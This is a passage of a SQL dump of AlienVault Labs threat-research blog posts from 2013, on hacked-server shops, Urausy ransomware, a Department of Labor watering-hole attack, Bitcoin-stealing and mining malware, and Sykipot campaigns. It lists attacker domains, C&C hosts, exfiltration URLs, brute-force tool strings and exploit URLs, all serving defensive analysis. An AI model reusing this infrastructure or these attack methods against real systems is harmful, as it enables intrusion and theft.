related:http://zhidao.baidu.com/question/442279402.htmlNow you can use the script we shared to hunt for new samples and instructions.Happy hunting!', 'malwareassemblyfpus', '/blogs/labs-research/hunting-for-malware-with-undocumented-instructions');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (60, 'Take care of your server, or it will be hacked and sold', 'Alberto Ortega', 'June 26, 2013 ', 'Have you ever had a server open to the internet with SSH service running? Then you know how common it is to receive break in attempts against your servers produced by automated bots that scan wide ranges of hosts trying weak combinations of user/password to log into remote machines.But what happens next? What is the business behind these activities?We have been investigating a criminal underground store dedicated to selling access to hacked (rooted) servers. Their customers can buy an administrator (root) account in a hacked server, and then perpetrate criminal activities from it, distribute malware, install a botnet CnC, upload illegal contents, send spam, etc ...We are going to study the store and their business following this index:- The criminal underground store.- How do they break into the servers.- Who is behind this business?The store seems to be quite profitable. The domain was registered on 07 April 2013 and the store website was probably made available some days after that. At the time of this research, they had around 400 customers, increasing day by day.The site is behind CloudFlare to be protected against attacks and keep the real location of the server hidden.\nThe logo and the welcome screen where the website is described looks like this:\nIn the screenshot we can see they had 13 rooted servers to be sold at that time, with different prices, locations and technical details.\nYou can even see the technical details of each server to check if it fits your needs.\nAs we have been able to see, most of the rooted servers were outdated, running pretty old software.At first, the site accepted Liberty Reserve for the payments, but as it is closed now, they accept Perfect Money and WebMoney.\nBut, how did they break into the servers?We have managed to get access to their tools and procedures to crack and collect servers. They were not using sophisticated methods to achieve their goals.The bad actors were mainly bruteforcing user accounts for SSH and Plesk with a wordlist of common combinations of username/password.Firstly, wide ranges of IPs were scanned using this fast and portable port scanner (named fever). It will look for 8443 and 22 open ports. The scanned ranges belonged to hosting companies.At the time of our research, they were scanning the range 72.10.32.0/19, property of Media Temple, Inc, a hosting company located in California.After that, they will try to break into the servers using SSH and Plesk bruteforce. To attack Plesk, a tool to automatically log in was used.$ strings -a top[...]easy initpasswd=%s&login_name=admin://%s:8443/login_up.php3top.location=%s:admin:%s%s Eu imi bag pula in perl can’t open %s[...]After we have seen their business and technical internals, who is behind it?We have found evidences that the shop administrators were Russian speakers. Some software installed in the server was set to Russian language.We have also found that they are or were involved in carding in the past, selling hacked PayPal accounts and credit cards, as a shop for this kind of stuff is hosted in the same server.\nThis is a good example of what can happen to a server if it is not properly protected, or has a weak password.System administrators should know what to do to avoid this: keep unnecessary services filtered, update your software and use strong passwords (or even better, authentication keys)!And do not forget to monitor all communications on the network, this can help you to prevent attacks or study post-compromise forensics.', 'criminalscrackingrootsstoreunderground', '/blogs/labs-research/take-care-of-your-server-or-it-will-be-hacked-and-sold');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (61, 'Urausy ransomware family, a quick internals overview', 'Alberto Ortega', 'June 17, 2013 ', 'Ransomware is popular among bad actors. Reveton malware family (based on Citadel) made a difference last year, now it is loosing popularity in favor of Urausy, just another lock-screen ransomware. There are a plenty of them living in the wild, but in this post we are going to focus on Urausy.These malware families are being spread by using exploit kits like Blackhole or Cool EK, which exploit vulnerabilities in web browsers, flash or Java, to install malicious software in victim’s computers.When the victim is vulnerable, and his computer gets infected with this kind of ransomware, the screen is locked supposedly from a legitimate law enforcement authority, asking for a “fine” that must be paid to restore normal access to the system and files. The malware accepts paysafe and ukash payments.Needless to say, this is a scam. Law enforcement authorities will never block your computer this way, and for sure they will never ask you for money from your computer.People from botnets.fr have made a great work collecting a lot of screens locked by Urausy and some more ransomware lockers.As we said, the infection vector is; vulnerable victim lands in an exploit kit infection page, which exploits a web browser vulnerability and executes malware (ransomware in this case).The malware sample is packed to avoid AV detection, but it is detected by most AV companies, 37 / 47.e8b714d4e9a380a09d1ef36dff09e814Once unpacked, we get e2e610583e9f03c74c944ffb374416c3, which is detected by less AV companies, 30 / 47 (weird, some of them were matching just the packing?).The piece has several anti-analysis tricks to avoid debugging and execution in sandboxing environments.It checks if it is running under the eye of a debugger, and has some VM artifacts embedded, not to stop working but probably to change the behavior.When started, the malware injects itself in benign Windows process svchost as a new thread, copies the piece in “C:\\Documents and Settings\\Administrator\\Application Data\\skype.dat” and a .ini file in “C:\\Documents and Settings\\Administrator\\Application Data\\skype.ini” to run at startup and gain persistance, and finally goes to sleep for a long time to avoid automated analysis.After that, the fireworks begin. The computer is locked with the screen shown at the beginning, to get this done, it uses CreateDesktopW (named MyDesktop) and CreateWindowEx (named YIWEFHIWQ) to take control over the whole UI, and then calls home (C&C).The C&C host is kidje[.]biz -> 50.7.166.134The communication is done by using HTTP and encapsulating encrypted data inside.We have developed a yara rule to match against memory of processes infected by Urausy, you can take it from our repo.AlienVault Unified Security Management (USM) is able to detect the activity of this ransomware family and all the other threats mentioned on this blog post.Security operators will see this kind of alarms for other similar ransomware families such as Rannoh, Bomba Locker, Galock or Reveton.', 'malwareransomwareurausy', '/blogs/labs-research/urausy-ransomware-family-a-quick-internals-overview');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (62, 'Yara rules and network detection for Operation Hangover', 'Jaime Blasco', 'May 23, 2013 ', 'Last week, our friends from Norman published a great report on a cyber espionage campaign named Operation Hangover.Â We have released some Yara rules to detect most of the payloads mentioned on the paper. You can download the rules from our Github space:On the other hand the Hangover attackers have been using several payloads with network capabilities to steal data including documents, keystrokes and downloading other payloads. Â Following are some examples of network traffic performed by these payloads:-Â Smackdown Minapro\n- Hangover\n- Several keyloggers and data harvesters\nSome of the network requests made by these payloads were covered by Snort rules (Emerging Threats) months before the Operation Hangover was uncovered) so our product was alerting on these connections from at least several weeks.AlienVault Unified Security Management (USM)Â will detect all the threats mentioned on the blog postÂ (andÂ itâs available as a Free 30 day trial download).', 'malwareapthangover', '/blogs/labs-research/yara-rules-and-network-detection-for-operation-hangover');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (63, 'New Internet Explorer zeroday was used in the DoL Watering Hole campaign', 'Jaime Blasco', 'May 5, 2013 ', 'In our first analysis we reported that the exploited vulnerability was CVE-2012-4792 . Further analysis showed that the vulnerability exploited wasn’t CVE-2012-4792 but a new zeroday vulnerability affecting Internet Explorer 8 (CVE-2013-1347). It was confirmed by Microsoft that released a Security Advisory on Friday as well as FireEye.In addition we have found that the U.S Department of Labor website wasn’t the only entity affected and we can confirm that at least 9 other websites were redirecting to the malicious server at the same time. The list of affected sites includes several non-profit groups and institutes as well as a big european company that plays on the aerospace, defence and security markets.Finally we detected several redirections to another malicious server located at www[.]sellagreement[.]com (198.96.92.107) that was serving parts of the malicious payloads found on dol[.]ns01[.]us.We recommend you to search your logs for connections to those domains and IP addresses.', 'cve-2013-1347', '/blogs/labs-research/new-internet-explorer-zeroday-was-used-in-the-dol-watering-hole-campaign');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (64, 'U.S. Department of Labor website hacked and redirecting to malicious code', 'Jaime Blasco', 'May 1, 2013 ', 'During the last few hours we have identified that one the U.S. Department of Labor website has been hacked and it is serving malicious code.Clarification:The website affected is the The Department of Labor (DOL) Site Exposure Matrices (SEM) Website “The Department of Labor (DOL) Site Exposure Matrices (SEM) Website is a repository of information gathered from a variety of sources regarding toxic substances present at Department of Energy (DOE) and Radiation Exposure Compensation Act (RECA) facilities covered under Part E of the Energy Employees Occupational Illness Compensation Program Act (EEOICPA)”As you can see in the following UrlQuery report the website is including code from the malicious server dol[.]ns01[.]us:Once you visit the website the following file is included:www[.]sem[.]dol[.]gov/scripts/textsize.js that contains the following code:  The browser will then execute a script from the malicious server dol[.]ns01[.]us:8081/web/xss.php The script will collect a lot of information from the system and then it will upload the information collected to the malicious server. Some of the functions to collect information are:flashver(): This function will collect information about the Flash software running on the system, including versions and OS detailsbitdefender2012check() and disabledbitdefender_2012(): The function will try to determine if BitDefender is running on the system checking for the injected code (netdefender/hui/ndhui.js) on the HTML of the webpage and it will try to deactivate the AV.avastcheck(): It checks if Avast Antivirus is running on the system detecting the presence of the Chrome extension:aviracheck(): It checks if Avira Antivirus is running on the system detecting the presence of the Chrome extension:java(): It collects information about Java versions running on the systemofficever(): It collects information about Microsoft Office versions installed on the systemplugin_pdf_ie(): It detects if Adobe Reader is installed in the system calling Acrobat Reader’s ActiveX object:jstocreate(): It detects if the system is running one of the following Antivirus:avirabitdefender_2013mcafee_enterpriseavg2012eset_nod32Dr.WebMsesophosf-secure2011Kaspersky_2012Kaspersky_2013Once all the information has been collected it sends the data to the following URL using a POST request:dol[.]ns01[.]us:8081/web/js[.]phpAn example of the information collected is as follow:Shockwave Flash 11.6.602,No Java or Disable or user uninstall it(if plugins have java)!,Avast!,Shockwave Flash(Name:NPSWF32_11_6_602_180.dll{Ver:11.6.602.180}),AVG SiteSafety plugin(Name:npsitesafety.dll{Ver:14.2.0.1}),MindSpark Toolbar Platform Plugin Stub(Name:NP4zStub.dll{Ver:1.0.1.1}),TelevisionFanatic Installer Plugin Stub(Name:NP64EISb.dll{Ver:1.0.0.1}),MinibarPlugin(Name:npMinibarPlugin.dll{Ver:1.0.0.1}),Photo Gallery(Name:NPWLPG.dll{Ver:16.4.3505.912}),Yahoo Application State Plugin(Name:npYState.dll{Ver:1.0.0.7}),Silverlight Plug-In(Name:npctrl.dll{Ver:5.1.10411.0}),Microsoft Office 2010(Name:NPSPWRAP.DLL{Ver:14.0.4761.1000}),Microsoft Office 2010(Name:NPAUTHZ.DLL{Ver:14.0.4730.1010}),Microsoft® Windows Media Player Firefox Plugin(Name:np-mswmp.dll{Ver:1.0.0.8}),PDF-XChange Viewer(Name:npPDFXCviewNPPlugin.dll{Ver:2.5.200.0})After sending the information about the system the following request is also made:dol[.]ns01[.]us:8081/update/index.phpAfter analyzing that file we found the following function:If we decode the eval string we find:After a quick analysis it seems the malicious server is exploiting CVE-2012-4792 that was fixed earlier this year. We are still verifying this information and we will give you more details when we confirm the vulnerability exploited is CVE-2012-4792.Once the vulnerability is exploited the system will download the payload from dol[.]ns01[.]us:8081/update/bookmark.png:After fixing the PE header we obtained the following PE file:https://www.virustotal.com/en/file/ea80dba427e7e844a540286faaccfddb6ef2c10a4bc6b27e4b29ca2b30c777fb/analysis/It has a detection rate of 2 / 46 at the time of writing this blog post.Once the payload is executed:- The malware will create a copy of itself in Documents and Settings\\[CURRENT_USER]\\Application Data\\conime.exe- It will create a registry key pointing to conime.exe on HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run conime to maintain persistence- It will connect to a C&C on microsoftUpdate.ns1.name currently pointing to a Google DNS server 8.8.8.8.An analysis of the malware shows the payload is using the following GET requests to communicate with the C&C server:/Photos/Query.cgi?loginid=[RANDOM_NUMBER]We are still investigating this attack and we will update the blog post if we obtain more information about it.Happy hunting!', 'deep pandacve-2012-4792', '/blogs/labs-research/us-department-of-labor-website-hacked-and-redirecting-to-malicious-code');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (65, 'UrlQuery Chrome Extension', 'Eduardo De la Arada', 'April 29, 2013 ', 'UrlQueryÂ is a service for detecting and analyzing web-based malware,Â claims its website, this service is very useful and provides a detailed report of theÂ submittedÂ webpage. We use these services a lot in the lab, so we’ve decided to make our lives easier by developing a simple context menu extension which automatically sendsÂ urls to the service.The extension adds a new option to the contextual menu. This option sends the link under the cursor to urlQuery.\nIt opens a new tab with the url added to the url’s queue. You have to wait a few seconds, while the url is being scanned, and then the full report is shown.\nAs urlQuery webpage, this extension has an options page where you can configure the User Agent, Refer, Acrobat Reader and Java versions. Unfortunately, a few options are provided by theÂ originalÂ page, but we expect some more parameters in the future.\nYou can get it from Chome Web Store by searching for “UrlQuery”.', 'malwareexploit kiturlquerychrome extension', '/blogs/labs-research/urlquery-chrome-extension');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (66, 'How cybercriminals are exploiting Bitcoin and other virtual currencies', 'Jaime Blasco', 'April 16, 2013 ', '- What is Bitcoin?Bitcoin is an online decentralised virtual currency based on an open source, P2P protocol. Bitcoins can be transferred using a computer without relying on a financial institution.If you haven’t heard about Bitcoin I recommend you watch the following video:Both the Bitcoin creation and transfer is performed by computers called “miners” that confirm the bitcoin’s creation by adding the information to a decentralised database. Bitcoins get harder to generate all the time. There are more that 10 million bitcoins in circulation today. The Bitcoin design only lets the creation of 21 million and that limit will be reached during the year 2140.The Bitcoin wallet is what gives you ownership of one or more Bitcoin addresses. You can use those addresses to send and receive coins from other users.Due to the complexity of mining bitcoins if you mine on your own it may be a long time until you can make some return. Bitcoin pools are places where multiple users can work together to make bitcoins and share benefits in a fair way.Finally, you can buy and sell bitcoins using several real-world currencies (EUR, USD ..) using several exchanges.Threat LandscapeDue to the growing popularity of the Bitcoin, it has become an attractive and profitable target for cybercriminals. During the last few years, we have seen an increase in the number of attacks and threats involving the virtual currency. The bad guys have adapted their tools to steal bitcoins from victims, use compromised systems to mine bitcoins and obtain benefit from it. On the other hand, virtual exchanges are also victims and we have seen how the attackers have phished the users of those exchanges and how they have performed Denial of Service attacks to destabilize the exchange rate and profit.Wallet stealingDuring the last few years, the capability of stealing the wallet.dat file has been added to several malware families. In addition, new malware families have appeared with the objective of stealing the wallet file from the infected machines.For example, a version of the Khelios malware that has been used to send Spam and steal data from infected systems added the capability to steal the wallet.dat file some time ago:As a result, if a Bitcoin’s user gets infected, the file containing the keys to use your bitcoin addresses will be stolen. The wallet file can be protected by a password but most of the malwares we have found have keylogging capabilities that could steal the wallet password as well.Another example is several IRC botnets that are running based on the “AthenaIRCBot” source code that has the capability of stealing the wallet file as well:Example: 08a9b6a933c8eac7919355d47a811aa2752df74473b8789bcfd567fb779708cd- Bitcoin miningApart from stealing the Bitcoin wallet, the number of malware families that can use the victim’s computer power to mine Bitcoins is getting bigger and bigger.We have found samples that install the Bitcoin daemon in the victim but the most frequently used technique is adding a piece of code that connects to a mining pool (public or private) to mine bitcoins.You can find variants of very well known malware families such as Zeus/Zbot that added this capability. As an example, we found a Zeus variant more than a year ago that had installed the Bitcoin daemon to mine bitcoins using the infected systems.That specific variant was distributed using Fake e-mail messages containing a link to the malicious file.Once the system got infected the Bitcoin client bitcoind was installed in the system. The Zeus variant was using the configuration file from:http://www[.]anshaa[.]com/z/config.binIn the last few months several Dorkbot variants including one that was using Skype to spread added the capability of mining bitcoins.Once the system gets compromised, a version of the Ufasoft Bitcoin miner is started. In this case, the attacker is running his own pooling server.The Ufasoft software contacts the mining pool server via HTTP:We have seen samples contacting the following servers that are owned by the same guys behind the botnet:suppp[.]cantvenlinea[.]biz:1942ahora[.]revisiondelpc[.]ru:2142xhuehs[.]cantvenlinea[.]ru:1942keep[.]hustling4life[.]biz:2142That infrastructure has been running for at least 5 months.Another gang has been running several Bitcoin mining servers for more than a year now. They have used Dorkbot as well as other malicious software to infect systems and use their computer power to mine bitcoins. Following is the list of malicious servers they have been using:m1[.]m94vo3[.]comxxa[.]m94vo3[.]compool[.]dload[.]asiaabcpool[.]dload[.]asiathehood[.]k4912m[.]comabc[.]dload[.]asiapaljacinke[.]aquarium-stakany[.]orgentropy[.]k4912m[.]comxxx[.]z0k3[.]orgxdx[.]8xx5[.]orgxd[.]x1x9[.]asiaxD[.]x3x9[.]asiawww[.]ewgtr[.]uswww[.]btcminers[.]bizsfx[.]dload[.]asiathehood[.]k4912m[.]comWe have found instances where the malicious actors are also mining Litecoins that is another virtual currency similar to Bitcoin.During the analysis of one of the malicious servers that was used to compromise users we found a GUI application that the attackers are using to build “Silent Miners” that are basically processes that run on the background, connect to the server pool that you configure and mine Litecoins/Bitcoins for you:The program will generate an executable file prepared to run in the background. It makes it very easy for the attackers to include or distribute the executable in the botnets they are already running.Apart from the infrastructure we have unveiled, we have found many different malwares with Bitcoin mining capabilities in the last few weeks. Some of them are distributed as fake software in P2P networks, using malicious web redirects (Blackhole Exploit Kit), Fake AV’s, etc.A lot of them also use public mining pools that are also used by regular users to mine bitcoins. Following is a list of malicious binaries we have found as well as the pool server and username they use:HashServerUsernameb21183ebee87ea86acd11e25a3a3b0d1notroll.in:6332tromm.57fdf03f888932a384b0089d391f01b2emining.eligius.st:83371663o1jPydX5fgTNsAW33owbsyC1gpwbvn544b1a3b310ebb9dc9a9d3858c8c7fe4pool.50btc.com:8332169TpR47JVcLaQXdGYE6Lv4Ps9DbVqHhSi9b7a5ab5e06c46b88e3182457b1e9a0fpool.50btc.com:833217F8N9AvEWSWRMgfR2WncDxhHCm2zLMgST6ba659c9f3de5b5d45a77b12c5ca1e7bmining.eligius.st:833717VJ4nebUbfBoydRC7vLynQruXyqMCDY1We26686c56297f259e936454e4ea3f7aemining.eligius.st:833717VJ4nebUbfBoydRC7vLynQruXyqMCDY1Wae1350e85fb01777d6b5f93384f23bdcmining.eligius.st: 83371ASNjJjUou6RPkmP81nJUuhbZDkxAaHQhXd770554455a70f3a3ad8e3326ddca765mining.eligius.st:83371ASNjJjUou6RPkmP81nJUuhbZDkxAaHQhXd911d82dc184bbfc952b77cb4cb1b743mining.eligius.st:83371ASNjJjUou6RPkmP81nJUuhbZDkxAaHQhX2f0312e6c46cd6e045f3be88e16ecb74pool.50btc.com:83321Dt8Ai9uNhupwxejr8PN631XTpbECTfQ2ye64d98da86cf03ff6088b48612870f83pool.50btc.com:83321Dt8Ai9uNhupwxejr8PN631XTpbECTfQ2y20d5c788a075113145261ee5dfab0fa0mining.eligius.st:83371ES11Ke5mxgz9MYiJ2Pb1MgY2FFYnfs5fA500d53fbf363ce31d75447a7ac335516mining.eligius.st:83371ES11Ke5mxgz9MYiJ2Pb1MgY2FFYnfs5fAe61b38b75d1cfefe9f631231666a9211mining.eligius.st:83371H1xa5PV522hUKfBqvfXPqu7buS5q9ckiW1a155713d6ff01a3e949730d6fe868d9mining.eligius.st:83371HH1Geovwhxq2UnNt6tiscF2kMsxYEVCRMd726542997e8aaca1c8c2809cc859f04pool.50btc.com:83321Hy8HbYrLPrXhGko2SmkUtMjBvBpVDEeMh974b155cef5cb549dcd81b62d26a7d7emining.eligius.st:83371Kjvxd9CbnYbigcC13gS5VAd2asNcdVSyH9384cb2d2b69d4023dbe2260b789c509mining.eligius.st:83371KyxrBp8mJRt3U6Q12LfuNLonZ9JHLYnbM9f878f2f555e690d447060bff7856dacmining.eligius.st:83371NqV1Dy7jH4SLXgbihQDRYA9qKgqnSfaVJbfe45e910c94c49e63e969cc2dd8c806mining.eligius.st:83371PyoNmwdNP7PQWQwjCLiK8Av5V9eAGhKcL:xbb0449dcb53723f6cb58d7024c16f887mining.eligius.st:83371Q3TM64corp7BCYY98pa88w9RoZSfxrH89a48fe740b8feff35b1dbc07ab99d949pool.50btc.com:83321qGYbXUe48RjdAoHuRhs4vvm118XMY6e335c3c3506064dbad08ba3a8a1ccd742beiswoj.uktop40chart.co.uk:802threade32caa62ef6e67e82c2b95c3b2b66db4litecoinpool.org:33338r9di23217.97123y9213052239a6a852a4eee3febe10268e25notroll.in:6332appap.66111ebdfcf7c58c953271dcbd594a417litecoinpool.org:9332aspen.41c5458ed87729b711310b6f0baf270bfpool.50btc.com:8332[email protected]_dodi5271a38bd18c8ad51d5e3b158db11b38eu.triplemining.com:8344Bool_Bool49d8ce6f361cc87f85fe12f4df73bda5us2.eclipsemc.com:8337cartoon1996_hm9gjp815ccc9f6a48cab368e41647c8f81722us2.eclipsemc.com:8337cartoon1996_server2a79e90f44bd136b3a977fe9fc93c1e0pool.50btc.com:8332[email protected]0eece32d0d55449366eae4462a4781c7eu.triplemining.com:8344comp_ponycc3dc3b176bbc34444117057659e9e14de.btcguild.com:8332cviper_175bd6e532370c06c567718d68e551647pool.50btc.com:8332[email protected]20c05310dc8bb6dd2cf0e4c642e475a1uscentral.btcguild.com:8332epix6_datacenter14decdf42f9eaf230768220edb361a0e0uscentral.btcguild.com:8332epix6_datacenter18c5fd67f62fbccf02f8e0e306341713duscentral.btcguild.com:8332epix6_datacenter138831b2e4e6ead08c23f7387919999afpool.50btc.com:8332[email protected]44ab7103e31a41b53401cedcabf9de6fus2.eclipsemc.com:8337happyworld_3b08ef6df987e03e86cc9af30942e8fd2us2.eclipsemc.com:8337happyworld_32d150ca060ed2d89ff031c0060275c99notroll.in:6332happyworld3000.1d1cc70aa60e76879da80303f0f79a894dns.domain-crawlers.com:8332[email protected]135cbc204145e63f7af441fff85f4ec7pool.50btc.com:8332[email protected]_4854387049a16de49fc6a02655c38c4ebeu.triplemining.com:8344IamX_Worker1a401a4a5051feb11fe594aad9b4bdf95pool.50btc.com:8332[email protected]4b8ad799881c4a79a32ea2a6576a8037mine3.btcguild.com:8332JennyEsta_666fuckerheadff925fbce01271e6a033febc27703762gief3.25u.com:8332jowsie_cheap23e4ef7f6727217b01c38ffcab91ef3c9pool.50btc.com:8332[email protected]add443fe32e35fb4a46e35ed2052b6f6miningpool.com:9350koji35.34d4fa3c12eb5f77529e08bb9873e54e1eu.triplemining.com:8344lezoum2010_pocket3f5589b0c8fc9b049e5fde81a642db6ceu.triplemining.com:8344loadrs2009_11fc06c8cdcbcff1fd5ecf07ded4bed93us2.eclipsemc.com:8337m1nd_jorgeeae08c3c4ab1e43ce8201b572b0b45115eu.triplemining.com:8344madhav007_pudge00747d21779b4e1d7195ae3eceafa1b163dltcmine.ru:3333MinerG_0ae03b006bb3eb6dcb2a64e3533862367ltcmine.ru:3333MinerG_17c3f67b7b4d3d5152757fd71bca6fbbfeltcmine.ru:3333MinerG_18202dfdf0ced47d213e833d8a92012d90ltcmine.ru:3333MinerG_260ed23a28270a27e5a4332ae521ee70b8ltcmine.ru:3333MinerG_343e348e07f5d98929baa0cb88f00cd8cfltcmine.ru:3333MinerG_7eb375ba9447d20401ee17192c2f9010dltcmine.ru:3333MinerG_8c1d4410b41ed7f534457f077370067a6us2.eclipsemc.com:8337moi_worker20c258e021449365a42f9b2fc7d0d4c8us2.eclipsemc.com:8337Mystical_pike2164bd712071628549a25f5eb97a5f35us2.eclipsemc.com:8337N785O1c_3cxQO9S2bab5ce7b48baea90b11244278bd6d57mine2.btcguild.com:8332o2521666_192b4c95a10d12132138ef15f44c9b9fcpool.50btc.com:8332[email protected]86ac869662e4b8f0422fb9cbca77d72epool.50btc.com:8332[email protected]c6cf7161100ff107b59b7b07db6pool.50btc.com:8332[email protected]b7752d762c5a9ac883caaefd1cc19c1beu.triplemining.com:8344pr3m1era_Bossnigger67e591f09ae0cea47f920878f100baa8pool.50btc.com:8332[email protected]3b6c8728ac3ee82a06bca7096265d666pool.50btc.com:8332[email protected]3eb76d2427c283d2c4b9b396bef275a2pool.50btc.com:8332[email protected]8f4ad4c95adef240f8edb5f3da09f164us2.eclipsemc.com:8337shrooms_miningda99275413845905166e8470980a155feu.triplemining.com:8344Sisocviper_siso7f1ef23a0076cedaeec0b7bb55b9702deu.triplemining.com:8344smackos_aliens1f85e27b2bd33c4d0ca377ad696fa563us2.eclipsemc.com:8337SSnack_workerbbfe230a8471e2b5d807df3368836bceeu.triplemining.com:8344Strick3n_stricken0b04c1538e5f3a37a81ec2086810b8e1pool.50btc.com:8332[email protected]_7b51128a0d8626a9b36f25679854d137euswest.btcguild.com:8332tester20122_3ccf5f50c9f919dbd9c0cc9a313ef5a2dpool.50btc.com:8332[email protected]3d31545f1889fa7593defb5f8bbc915apool.50btc.com:8332[email protected]43cc15d6178c0fa7845fe257a58f5e0bnotroll.in:6332tophosts.19425c6b7654e8e9ceba5894862e28970notroll.in:6332tromm.14865341e5ae9e6fd01eca8e6bb31b4e5dus2.eclipsemc.com:8337vapor_workerce38c3479d126c80298e0fe76e73e8e5pool.50btc.com:8332[email protected]d20be24e318844a56d3f38f2d1061ddepool.50btc.com:8332[email protected]c24700038e25f4ed1aea01bc374ed5a1pool.50btc.com:8332[email protected]_vd11b21251ef6f8f84efc7130525a4785pool.50btc.com:8332[email protected]Show me the moneyAs you can see in the previous table some of the bad guys were using Bitcoin addresses instead of usernames to connect to the pool servers.Due to the openness of the Bitcoin’s protocol, we can access the information and the transactions done by those accounts.169TpR47JVcLaQXdGYE6Lv4Ps9DbVqHhSi, 91.39938806 BTC ,$ 8,317.3417F8N9AvEWSWRMgfR2WncDxhHCm2zLMgST, 20.89356766 BTC , $ 1,901.311ASNjJjUou6RPkmP81nJUuhbZDkxAaHQhX, 420.81569559 BTC, $ 38,294.231H1xa5PV522hUKfBqvfXPqu7buS5q9ckiW, 31.00274179 BTC , $ 2,821.251Kjvxd9CbnYbigcC13gS5VAd2asNcdVSyH, 88.99839055 BTC , $ 8,098.851KyxrBp8mJRt3U6Q12LfuNLonZ9JHLYnbM, 77.55520657 BTC , $ 7,057.521Q3TM64corp7BCYY98pa88w9RoZSfxrH8, 48.69058357 BTC , $ 4,430.84For instance, we can see these two Bitcoin addresses probably belong to the same bad actors:169TpR47JVcLaQXdGYE6Lv4Ps9DbVqHhSi1ASNjJjUou6RPkmP81nJUuhbZDkxAaHQhXThose two accounts sent most of the money to the following account:1827x95K36G3NFxDqiNwo6aE1rH55Ua3p5That Bitcoin address received a total amount of 1050.21 BTC in the last few months. If the bad guys sold that amount of bitcoins some days ago when a single Bitcoin was worth $265 they could have made $278k. Not bad for a small Botnet!MtGox Fake sitesMtgox is the largest Bitcoin exchange where you can trade Bitcoins for EUR/US, etc. In the last few weeks, the increased popularity of both Bitcoin and Mtgox has made it an attractive target for attackers.Last week, we detected several websites that were attempting to target Mtgox users. An attacker set up the fake website www[.]mtgox-chat[.]info:The malicious server looks like an official Mtgox website with a chat on it. Once the user enters the site it will try to load a malicious Java applet:The Java applet will download and execute a binary file from a remote site.Once the file is executed the victim gets infected and the system will contact the C&C server on:tamere123[.]no-ip[.]orgHaving access to the victim’s system the attacker can now get the Mtgox’s credentials and steal the money/bitcoins from the victim.Impact on the enterpriseThe detection of mining software in your network could indicate either a misuse of resources by your employees or an infection that could lead to financial losses.The following best practices will help you prevent these threats:- Keep software up to date- Update your Antivirus signatures- Run a Vulnerability Assessment Program- Monitor your networks to detect suspicious network behaviors.AlienVault Unified Security Management (USM) will detect all the threats mentioned on the blog post:If you want to increase your network visibility you can try our Unified Security Management solution or download the Open Source version.', 'botnetbitcoinddoszeuslitecoinmtgoxdarkometdorkbotkhelioswallet', '/blogs/labs-research/how-cybercriminals-are-exploiting-bitcoin-and-other-virtual-currencies');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (67, 'New Sykipot developments', 'Jaime Blasco', 'March 21, 2013 ', 'SummaryDuring the last few years, we have been publishing about a group of hackers who have focused on targeting DIB (Defence Industrial Base) and other government organizations:- Another Sykipot sample likely targeting US federal agencies- Are the Sykipot’s authors obsessed with next generation US drones?- Sykipot variant hijacks DOD and Windows smart cards- Sykipot is backSykipot are a highly skilled group of individuals who have exploited a wide range of zeroday vulnerabilities in the last few years including:CVEDateProductCVE-2007-06712007-02-02Microsoft ExcelCVE-2009-39572010-12-01Adobe ReaderCVE-2010-08062010-05-04Internet ExplorerCVE-2010-28832010-09-08Adobe ReaderCVE-2010-36542010-10-28Adobe Flash PlayerCVE-2011-24622011-12-06Adobe ReaderIn this blog post we will unveil the new vulnerabilities that this group have used using during the last 8 months and we will publish the new infrastructure they have used. We will expose several examples of the campaigns they have launched and new versions of the Sykipot backdoor they have used to access the compromised systems. We have found evidences that show they have exploited at least the following vulnerabilities during the last few months:CVEDateProductCVE-2012-188906/13/2012MSXML/Internet ExplorerCVE-2012-172306/12/2012Java 7CVE-2012-496909/16/2012Microsoft Internet ExplorerCVE-2013-064002/12/2012Adobe Acrobat ReaderSeveral times the date of the exploit was a few days after the vulnerability had been disclosed and there wasn’t a patch released by the vendor.CampaignsIn the past most of the campaigns which we found related to the Sykipot actors were based on SpearPhishing mails with attachments that exploited vulnerabilities in software like Microsoft Office, Adobe Flash, Adobe PDF and some times Internet Explorer. During the last 8-10 months we have seen a change and the number of SpearPhishing campaigns which have included a link instead of an attachment and this has increased. Once the victim clicks in the link the attackers will use vulnerabilities in Internet Explorer, Java, etc to access the system.Some examples of the campaigns they have launched are detailed below.gsasmartpay.org - 2012-06-20The last summer, we found a malicious site that the Sykipot actors set up to try and phish government employees. When the victim visited the link the following page appeared:As we can see it shows the information present in https://smartpay.gsa.gov/.“The GSA SmartPay program, established in 1998, is the largest charge card program in the world serving more than 350 federal agencies, organizations, and Native American tribal governments. In FY10, approximately 98.9M transactions were made and $30.2B were charged using the GSA SmartPay charge cards, creating $325.9M in refunds.”“Eligibility for the program is determined by the GSA SmartPay Contracting Officer. Federal agencies, departments, tribal organizations, and approved non-federal entities can apply to obtain charge card services under the GSA SmartPay program.”If we take a look at the malicious files we will find that it was exploiting CVE-2012-1889 in the background:During the exploitation it will load the following files as well:www[.]gsasmartpay[.]org/cardholders/login/movie[.]swf?apple=AA969692D8CDCD959595CC859183918F83909692839BCC8D9085CD83868D808784CC919584E2E2E2E2www[.]gsasmartpay[.]org/cardholders/login/deployJava[.]jswww[.]gsasmartpay[.]org/cardholders/login/faq[.]htmWe are not going to show how this vulnerability is exploited since we have showed it in previous blog posts, you can find a good description here.searching-job.net is another domain registered by the Sykipot actors (registered by [email protected] on 06-20-2012) that was also serving the same exploit at that time:www[.]searching-job[.]net/list/verification/deployJava[.]jswww[.]searching-job[.]net/list/verification/faq[.]htmwww[.]searching-job[.]net/list/verification/index[.]htmwww[.]searching-job[.]net/list/verification/movie[.]swf?apple=AA969692D8CDCD959595CC91878390818A8B8C85CF888D80CC8C8796CD848B8E878E8B9196CC868396E2E2E2E2www[.]searching-job[.]net/account_list/verification/index[.]htmApart from gsasmartpay.org we have found several domains registered by the Sykipot actors that they have probably used to phish users in the last few months. Some of the most 